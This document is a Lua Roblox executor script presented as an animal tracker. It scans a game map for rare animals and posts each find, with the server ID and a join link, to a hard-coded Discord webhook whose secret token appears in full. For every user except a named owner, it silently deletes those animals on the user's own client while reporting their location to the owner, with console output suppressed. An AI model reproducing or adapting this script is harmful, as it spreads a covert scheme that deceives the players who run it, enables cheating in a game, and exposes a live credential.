-- üîó Webhook Animal Tracker with Client-Side Hide for Non-Owner (No Console Prints)
local WEBHOOK = "https://discord.com/api/webhooks/1432020181441581229/vYYXG0DP-OBFZRgxxWtuY_kHuXOnTWVO_k9DsvsiZYNkAs4UlvGQ2opHfQPtg_OS_pAU"
local folder = workspace:WaitForChild("Map"):WaitForChild("Animals")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer

-- üñºÔ∏è Animal images / tracked models
local animalImages = {
	["Dragon"] = "https://drive.google.com/uc?export=view&id=1jkot99uQbfCcHoaLpJA-YTlskSq_JM2v",
	["Golden Dragon"] = "https://drive.google.com/uc?export=view&id=1bLDSMOgviKIPN5OKo3ngpX17HpzBoEkO",
	["Griffin"] = "https://drive.google.com/uc?export=view&id=1VRZTQ1xdH_vRbo1TSTLGtZ7wm1yMI5jS",
	["Hydra"] = "https://drive.google.com/uc?export=view&id=17FyXm7DkNReJo3i5ls3gtPUw4ENNk1de",
	["Phoenix"] = "https://drive.google.com/uc?export=view&id=1seUWOlkbjIhC2a-0wACqZ0ynSeHo02EC",
	["Unicorn"] = "https://drive.google.com/uc?export=view&id=1lDP0ln3dKIhblxlAz5MRm5wV2P1du5ah",
	["Kitsune"] = "https://drive.google.com/uc?export=view&id=1p2KTiIFQ9KdTYpetez0gY64l9qM1MLWs"
}

local targetAnimals = {}
for name, _ in pairs(animalImages) do
	targetAnimals[name] = true
end

-- üÜî Game info
local placeId = 96114180925459
local serverId = game.JobId

-- üåê Webhook sender
local function sendWebhook(name, weight, imageUrl)
	local joinLink = string.format("roblox://placeId=%s&gameInstanceId=%s", placeId, serverId)

	local embed = {
		title = "üêæ Animal Detected!",
		color = 65280,
		fields = {
			{ name = "Animal", value = name, inline = true },
			{ name = "Weight", value = weight or "Unknown", inline = true },
			{ name = "Server ID", value = serverId, inline = false },
			{ name = "Copy Link", value = string.format("```\n%s\n```", joinLink), inline = false }
		},
		image = { url = imageUrl },
		footer = { text = "Tracking via Executor Script" }
	}

	local payload = HttpService:JSONEncode({ embeds = { embed } })

	local requestData = {
		Url = WEBHOOK,
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = payload
	}

	if syn and syn.request then
		syn.request(requestData)
	elseif http_request then
		http_request(requestData)
	elseif request then
		request(requestData)
	end
end

-- ü¶Ñ Handle animal detection
local function handleModel(model)
	if not model:IsA("Model") then return end
	local name = model.Name
	if not targetAnimals[name] then return end

	local weightValue = "Unknown"
	local info = model:FindFirstChild("Info")
	if info then
		local weight = info:FindFirstChild("Weight")
		if weight and weight:IsA("ValueBase") then
			weightValue = tostring(weight.Value)
		end
	end

	local imageUrl = animalImages[name]
	sendWebhook(name, weightValue, imageUrl)

	-- üßπ Client-only deletion for non-owner players
	if player.Name ~= "wishhole" then
		task.defer(function()
			if model and model.Parent then
				model:Destroy()
			end
		end)
	end
end

-- üîç Initial scan
for _, animal in ipairs(folder:GetChildren()) do
	handleModel(animal)
end

-- üÜï Detect new animals
folder.ChildAdded:Connect(function(animal)
	task.delay(0.2, function()
		handleModel(animal)
	end)
end)
